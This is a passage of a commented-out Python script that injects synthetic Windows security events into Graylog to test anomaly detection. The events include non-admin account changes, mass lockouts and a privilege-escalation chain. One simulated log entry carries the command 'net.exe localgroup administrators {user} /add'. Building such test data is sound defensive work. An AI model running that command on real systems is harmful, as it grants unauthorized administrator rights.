#     target = random.choice([u for u in REGULAR_USERS if u != user])
#     send_to_graylog({
#         "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
#         "Category": "AccountManagementEvents", "EventID": 4724,
#         "SubjectUserName": user,
#         "TargetUserName": target,
#         "_scenario": "ANOMALY_ACCT_4724_NONADMIN"
#     })

# def send_anon_nonadmin_disables_account(dt, user):
#     """4725 — Regular user disabling another account. Should only be admin action."""
#     target = random.choice([u for u in REGULAR_USERS if u != user])
#     send_to_graylog({
#         "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
#         "Category": "AccountManagementEvents", "EventID": 4725,
#         "SubjectUserName": user,
#         "TargetUserName": target,
#         "_scenario": "ANOMALY_ACCT_4725_NONADMIN"
#     })

# def send_anon_nonadmin_deletes_account(dt, user):
#     """4726 — Regular user deleting an account. High-severity anomaly."""
#     target = random.choice([u for u in REGULAR_USERS if u != user])
#     send_to_graylog({
#         "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
#         "Category": "AccountManagementEvents", "EventID": 4726,
#         "SubjectUserName": user,
#         "TargetUserName": target,
#         "_scenario": "ANOMALY_ACCT_4726_NONADMIN"
#     })

# def send_anon_nonadmin_group_add(dt, user):
#     """4728/4732 — Non-admin adding members to security/local group."""
#     event_id = random.choice([4728, 4732])
#     send_to_graylog({
#         "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
#         "Category": "AccountManagementEvents", "EventID": event_id,
#         "SubjectUserName": user,
#         "TargetUserName": random.choice(["attacker_svc", f"ghost_{random.randint(1,99)}"]),
#         "_scenario": f"ANOMALY_ACCT_{event_id}_NONADMIN"
#     })

# def send_anon_nonadmin_group_remove(dt, user):
#     """4729/4733 — Non-admin removing members (covering tracks)."""
#     event_id = random.choice([4729, 4733])
#     send_to_graylog({
#         "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
#         "Category": "AccountManagementEvents", "EventID": event_id,
#         "SubjectUserName": user,
#         "TargetUserName": random.choice(REGULAR_USERS),
#         "_scenario": f"ANOMALY_ACCT_{event_id}_NONADMIN"
#     })

# def send_anon_mass_lockout(now, day_offset):
#     """4740 — Multiple accounts locked out in rapid succession (attacker triggering lockouts)."""
#     base_dt = off_hours_dt(now, day_offset)
#     for j, user in enumerate(REGULAR_USERS):
#         lock_dt = base_dt + timedelta(seconds=j * random.randint(5, 20))
#         if lock_dt > now - timedelta(minutes=2):
#             break
#         send_to_graylog({
#             "version": "1.1", "host": "AD01", "timestamp": lock_dt.timestamp(),
#             "Category": "AccountManagementEvents", "EventID": 4740,
#             "SubjectUserName": random.choice(["attacker_svc", "svc_backup"]),
#             "TargetUserName": user,
#             "_scenario": "ANOMALY_ACCT_4740_MASS_LOCKOUT"
#         })

# def send_anon_nonadmin_renames_account(dt, user):
#     """4781 — Regular user renaming an account (covering tracks or escalating)."""
#     send_to_graylog({
#         "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
#         "Category": "AccountManagementEvents", "EventID": 4781,
#         "SubjectUserName": user,
#         "TargetUserName": random.choice([u for u in REGULAR_USERS if u != user]),
#         "_scenario": "ANOMALY_ACCT_4781_NONADMIN"
#     })

# def send_anon_privilege_escalation(dt, user):
#     """4688 net /add + 4720 account creation — full priv-esc chain across PROC+ACCT."""
#     send_to_graylog({
#         "version": "1.1", "host": "AD01", "timestamp": dt.timestamp(),
#         "Category": "ProcessCreationEvents", "EventID": 4688,
#         "SubjectUserName": user,
#         "CommandLine": f"net.exe localgroup administrators {user} /add",
#         "_scenario": "ANOMALY_PRIVESC_CMD"
#     })
#     follow_dt = dt + timedelta(seconds=random.randint(10, 60))
#     if follow_dt < dt + timedelta(hours=1):
#         send_to_graylog({
#             "version": "1.1", "host": "AD01", "timestamp": follow_dt.timestamp(),
#             "Category": "AccountManagementEvents", "EventID": 4720,
#             "SubjectUserName": user,
#             "TargetUserName": f"escalated_{user}",
#             "_scenario": "ANOMALY_PRIVESC_ACCT"
#         })

# # =========================================================
# # MAIN GENERATOR
# # =========================================================
# def generate_diverse_anomalies(n=60):
#     now        = datetime.now()
#     total_days = get_safe_total_days(now)
#     if total_days == 0:
#         print("[!] BASE_DATE is too recent — no valid date range.")
#         return

#     safe_end = now - timedelta(days=1)
#     print(f"Injecting {n} anomaly groups into {BASE_DATE.date()} – {safe_end.date()} window...")

#     # One sender per scenario — cycled evenly so every EventID gets coverage
#     # Each tuple: (function, needs_user, needs_day_offset, needs_now_only)
#     scenarios = [
#         # AUTH
#         ("unknown_logon",       send_anon_unknown_user_logon,       False, False),
#         ("known_ext_ip",        send_anon_known_user_ext_ip,        True,  False),
#         ("brute_force",         send_anon_brute_force,              True,  True ),
#         ("suspicious_logoff",   send_anon_suspicious_logoff,        False, False),
#         ("explicit_cred_ext",   send_anon_explicit_cred_external,   True,  False),
#         ("special_priv_unknown",send_anon_special_privs_unknown,    False, False),
#         ("lateral_movement",    send_anon_lateral_movement,         True,  True ),
#         ("sunday_auth",         send_anon_sunday_auth,              False, True ),
#         # PROC
#         ("known_susp_cmd",      send_anon_known_user_suspicious_cmd,True,  False),
#         ("unknown_user_cmd",    send_anon_unknown_user_cmd,         False, False),
#         ("proc_exit_susp",      send_anon_process_exit_suspicious,  True,  False),
#         ("sunday_proc",         send_anon_sunday_proc,              False, True ),
#         # ACCT
#         ("nonadmin_create",     send_anon_nonadmin_creates_account, True,  False),
#         ("unknown_target_en",   send_anon_unknown_target_enabled,   False, False),
#         ("nonadmin_pwd_change", send_anon_nonadmin_password_change, True,  False),
#         ("nonadmin_pwd_reset",  send_anon_nonadmin_resets_password, True,  False),
#         ("nonadmin_disable",    send_anon_nonadmin_disables_account,True,  False),
#         ("nonadmin_delete",     send_anon_nonadmin_deletes_account, True,  False),
#         ("nonadmin_grp_add",    send_anon_nonadmin_group_add,       True,  False),
#         ("nonadmin_grp_remove", send_anon_nonadmin_group_remove,    True,  False),
#         ("mass_lockout",        send_anon_mass_lockout,             False, True ),
#         ("nonadmin_rename",     send_anon_nonadmin_renames_account, True,  False),
#         ("priv_escalation",     send_anon_privilege_escalation,     True,  False),
#     ]

#     for i in range(n):
#         day_offset   = random.randint(0, total_days)
#         user         = random.choice(REGULAR_USERS)
#         dt           = off_hours_dt(now, day_offset)
#         name, fn, needs_user, needs_now = scenarios[i % len(scenarios)]

#         if needs_now and needs_user:
#             fn(now, day_offset, user)
#         elif needs_now and not needs_user:
#             if name == "mass_lockout":
#                 fn(now, day_offset)
#             else:
#                 fn(now)
#         elif needs_user:
#             if name == "nonadmin_create":
#                 fn(dt, i)
#             else:
#                 fn(dt, user)
#         else:
#             fn(dt)

#     print(f"  [+] Done. Injected {n} anomaly groups across {len(scenarios)} scenario types.")

# if __name__ == "__main__":
#     generate_diverse_anomalies()
